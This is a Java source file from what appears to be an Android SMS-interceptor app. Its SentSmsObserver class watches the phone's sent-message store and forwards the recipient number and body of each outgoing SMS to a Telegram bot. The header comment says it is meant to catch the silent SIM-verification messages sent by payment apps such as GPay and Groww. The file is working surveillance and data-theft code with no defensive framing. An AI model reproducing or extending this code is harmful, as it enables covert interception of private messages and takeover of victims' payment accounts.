package com.tok.interceptor;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

/**
 * Watches content://sms/sent for new outgoing SMS.
 * Fires whenever GPay / Groww / any app silently sends a SIM-verification SMS.
 * Forwards destination number + body to Telegram.
 */
public class SentSmsObserver extends ContentObserver {

    private static final String TAG = "SentSmsObserver";
    private static final Uri SMS_SENT_URI = Uri.parse("content://sms/sent");

    private final Context context;
    private long lastSeenId = -1;

    public interface SentSmsListener {
        void onSentSms(String toNumber, String body);
    }
    private static SentSmsListener listener;

    public static void setListener(SentSmsListener l) {
        listener = l;
    }

    public SentSmsObserver(Context context) {
        super(new Handler(Looper.getMainLooper()));
        this.context = context.getApplicationContext();
        // seed lastSeenId so we only catch NEW entries going forward
        lastSeenId = getLatestSentId();
    }

    @Override
    public void onChange(boolean selfChange) {
        onChange(selfChange, SMS_SENT_URI);
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        checkNewSentSms();
    }

    private void checkNewSentSms() {
        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(
                SMS_SENT_URI,
                new String[]{"_id", "address", "body", "date"},
                null, null,
                "date DESC"
            );
            if (cursor == null || !cursor.moveToFirst()) return;

            long id   = cursor.getLong(cursor.getColumnIndexOrThrow("_id"));
            String to = cursor.getString(cursor.getColumnIndexOrThrow("address"));
            String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));

            if (id <= lastSeenId) return; // already seen
            lastSeenId = id;

            if (to == null) to = "unknown";
            if (body == null) body = "";

            Log.d(TAG, "Outgoing SMS to: " + to + " | body: " + body);

            final String finalTo   = to;
            final String finalBody = body;

            // notify UI
            if (listener != null) {
                listener.onSentSms(finalTo, finalBody);
            }

            // forward to Telegram
            new Thread(() -> {
                try {
                    android.content.SharedPreferences prefs =
                        context.getSharedPreferences("config", Context.MODE_PRIVATE);
                    String botToken  = prefs.getString("bot_token", "");
                    String channelId = prefs.getString("channel_id", "");

                    if (botToken.isEmpty() || channelId.isEmpty()) return;

                    TelegramForwarder fwd = new TelegramForwarder(botToken, channelId);
                    fwd.sendOutgoingSms(finalTo, finalBody);
                } catch (Exception e) {
                    Log.e(TAG, "Forward failed: " + e.getMessage());
                }
            }).start();

        } catch (Exception e) {
            Log.e(TAG, "Error reading sent SMS: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
    }

    private long getLatestSentId() {
        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(
                SMS_SENT_URI,
                new String[]{"_id"},
                null, null,
                "date DESC"
            );
            if (cursor != null && cursor.moveToFirst()) {
                return cursor.getLong(0);
            }
        } catch (Exception ignored) {
        } finally {
            if (cursor != null) cursor.close();
        }
        return -1;
    }

    public void register() {
        context.getContentResolver().registerContentObserver(
            SMS_SENT_URI, true, this);
        Log.d(TAG, "Registered sent SMS observer");
    }

    public void unregister() {
        context.getContentResolver().unregisterContentObserver(this);
        Log.d(TAG, "Unregistered sent SMS observer");
    }
}
